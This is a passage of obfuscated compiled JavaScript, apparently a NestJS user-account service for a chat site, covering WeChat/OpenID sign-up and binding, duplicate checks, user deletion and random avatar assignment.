_0xa2ed7c=_0x1ef43b?_0x1ef43b[_0x3db3e3(0x225)](':')[0x1]:'',_0x40fbf5=await this[_0x3db3e3(0x1fe)](_0xa2ed7c),_0x56e668=await this[_0x3db3e3(0x27e)](_0x259c3c,_0xa2ed7c);return await this['userBalanceService'][_0x3db3e3(0x262)](_0x56e668['id'],_0xa2ed7c?_0x40fbf5===null||_0x40fbf5===void 0x0?void 0x0:_0x40fbf5['id']:null),_0x56e668;}return _0x1d1efb;}async['createUserFromOpenId'](_0x391f11,_0x4c9bb1){const _0x271e98=_0x51a44a,_0x340212=await this['globalConfigService'][_0x271e98(0x250)]([_0x271e98(0x2bd)]),_0x1b0210={'avatar':_0x340212,'username':'用户'+(0x0,utils_1[_0x271e98(0x2a1)])(),'status':user_constant_1['UserStatusEnum']['ACTIVE'],'sex':0x0,'email':(0x0,utils_1['createRandomUid'])()+'@default.com','invitedBy':_0x4c9bb1,'openId':_0x391f11},_0x2da30c=await this['userEntity'][_0x271e98(0x287)](_0x1b0210);return _0x2da30c;}async[_0x51a44a(0x274)](_0x45e28a,_0x2a0d7c){const _0x15e219=_0x51a44a;try{const _0x432ec1=await this[_0x15e219(0x2b9)][_0x15e219(0x1ff)]({'where':{'id':_0x2a0d7c}});if(!_0x432ec1)return{'status':![],'msg':_0x15e219(0x20b)};const _0x22e22d=await this[_0x15e219(0x2b9)][_0x15e219(0x1ff)]({'where':{'openId':_0x45e28a}});if(_0x22e22d)return{'status':![],'msg':_0x15e219(0x24b)};const _0x41f41c=await this[_0x15e219(0x2b9)][_0x15e219(0x22c)]({'id':_0x2a0d7c},{'openId':_0x45e28a});if(_0x41f41c[_0x15e219(0x23f)]<=0x0)return{'status':![],'msg':_0x15e219(0x1f9)};return{'status':!![],'msg':_0x15e219(0x2ae)};}catch(_0x3c4ef2){return{'status':![],'msg':'绑定微信失败、请联系管理员！'};}}async[_0x51a44a(0x28c)](_0x4d7cf8){const _0x4f3f45=_0x51a44a,_0x555045=await this[_0x4f3f45(0x2b9)][_0x4f3f45(0x1ff)]({'where':{'id':_0x4d7cf8}});return _0x555045===null||_0x555045===void 0x0?void 0x0:_0x555045[_0x4f3f45(0x21d)];}async[_0x51a44a(0x27c)](_0x435d53){const _0x7c331e=_0x51a44a,{username:_0x406d34,password:_0x4763c6,phone:_0xeae374,phoneCode:_0x3c22ba}=_0x435d53,_0x2a388b=await this[_0x7c331e(0x2b9)][_0x7c331e(0x1ff)]({'where':[{'username':_0x406d34},{'phone':_0xeae374}]});if(_0x2a388b&&_0x2a388b['username']===_0x406d34)throw new common_1[(_0x7c331e(0x25f))](_0x7c331e(0x2b3),common_1['HttpStatus'][_0x7c331e(0x214)]);if(_0x2a388b&&_0x2a388b[_0x7c331e(0x253)]===_0xeae374)throw new common_1[(_0x7c331e(0x25f))](_0x7c331e(0x269),common_1[_0x7c331e(0x283)][_0x7c331e(0x214)]);}async['createUser'](_0x1a28b4){const _0x3e95ef=_0x51a44a;return await this[_0x3e95ef(0x2b9)]['save'](_0x1a28b4);}async[_0x51a44a(0x200)](_0x49e01c){const _0x5df27b=_0x51a44a,{id:_0x574c21,secret:_0x1623df,moreId:_0x214553}=_0x49e01c;if(!_0x1623df||_0x1623df!==(0x0,utils_1[_0x5df27b(0x285)])(_0x5df27b(0x271)))throw new common_1[(_0x5df27b(0x25f))](_0x5df27b(0x2a9),common_1[_0x5df27b(0x283)][_0x5df27b(0x214)]);if(_0x574c21)return await this[_0x5df27b(0x2b9)][_0x5df27b(0x22f)]({'id':_0x574c21});if(_0x214553)return await this[_0x5df27b(0x2b9)]['delete']({'id':(0x0,typeorm_2[_0x5df27b(0x291)])(_0x214553)});}[_0x51a44a(0x264)](_0x70ac05){const _0x30f999=_0x51a44a;return Math[_0x30f999(0x20d)](Math['random']()*_0x70ac05);}async['randomAvatarFromUser'](){const _0x3a6c08=_0x51a44a,_0x4a2f1a=[_0x3a6c08(0x23a),'https://cdn.nineai.chat/avatar/02.png',_0x3a6c08(0x26d),_0x3a6c08(0x280),_0x3a6c08(0x241),'https://cdn.nineai.chat/avatar/06.png','https://cdn.nineai.chat/avatar/07.png','https://cdn.nineai.chat/avatar/08.png','https://cdn.nineai.chat/avatar/09.png',_0x3a6c08(0x259),_0x3a6c08(0x20a),_0x3a6c08(0x255),'https://cdn.nineai.chat/avatar/13.png',_0x3a6c08(0x242),_0x3a6c08(0x1f8),_0x3a6c08(0x222),_0x3a6c08(0x292),_0x3a6c08(0x28f),_0x3a6c08(0x1f4),_0x3a6c08(0x28a)],_0x4e9aa7=await this[_0x3a6c08(0x2b9)][_0x3a6c08(0x208)]({'select':['id']}),_0x1c5747=_0x4e9aa7['map'](_0x2fabd0=>_0x2fabd0['id']);for(let _0x2865d7=0x0;_0x2865d7<_0x1c5747[_0x3a6c08(0x2ba)];_0x2865d7++){const _0x4d975b=_0x1c5747[_0x2865d7],_0x8a615=this['generateRandomIndex'](0x14),_0x42edb3=_0x4a2f1a[_0x8a615];await this[_0x3a6c08(0x2b9)][_0x3a6c08(0x22c)]({'id':_0x4d975b},{'avatar':_0x42edb3}),console[_0x3a6c08(0x2ac)](_0x3a6c08(0x267),_0x4d975b);}}};function _0x150e(_0x3de3e4,_0x757dc6){const _0x2fa590=_0x2fa5();return _0x150e=function(_0x150e75,_0x2afbf5){_0x150e75=_0x150e75-0x1ef;let _0x5bf21e=_0x2fa590[_0x150e75];return _0x5bf21e;},_0x150e(_0x3de3e4,_0x757dc6);}UserService=__decorate([(0x0,common_1[_0x51a44a(0x26c)])(),__param(0x0,(0x0,typeorm_1[_0x51a44a(0x237)])(user_entity_1[_0x51a44a(0x2bc)])),__param(0x1,(0x0,typeorm_1[_0x51a44a(0x237)])(whiteList_entity_1[_0x51a44a(0x273)])),__param(0x7,(0x0,typeorm_1[_0x51a44a(0x237)])(config_entity_1[_0x51a44a(0x231)])),__metadata(_0x51a44a(0x27b),[typeorm_2[_0x51a44a(0x263)],typeorm_2[_0x51a44a(0x263)],typeorm_2[_0x51a44a(0x252)],verification_service_1[_0x51a44a(0x256)],mailer_1[_0x51a44a(0x23e)],userBalance_service_1[_0x51a44a(0x239)],globalConfig_service_1['GlobalConfigService'],typeorm_2['Repository']])],UserService),exports[_0x51a44a(0x246)]=UserService;